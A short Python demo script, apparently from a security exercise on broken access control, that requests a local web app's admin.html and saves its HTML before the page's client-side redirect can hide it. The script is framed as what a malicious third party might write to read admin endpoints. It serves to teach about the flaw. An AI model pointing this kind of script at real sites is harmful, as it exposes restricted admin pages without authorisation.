# Author: Andrew Higgins
# https://github.com/speckly

# A01 Brief demo
# A script a malicious third party may create to capture the contents of admin.html 
# Before it redirects to index.html

import requests
import bs4
import os

ENDPOINT = "/admin.html"
URL = f"http://localhost:3001{ENDPOINT}"

os.system('cls')
print("Script by @speckly\ncats using netcat\n")

bt = requests.get(URL).text
soup = bs4.BeautifulSoup(bt, 'html.parser')

# Write out
oName = './exploit_demos/admin.html'
with open(oName, 'w') as outFile:
    outFile.write(soup.prettify())

print(f"View {oName}. We see what endpoints admins can use ")

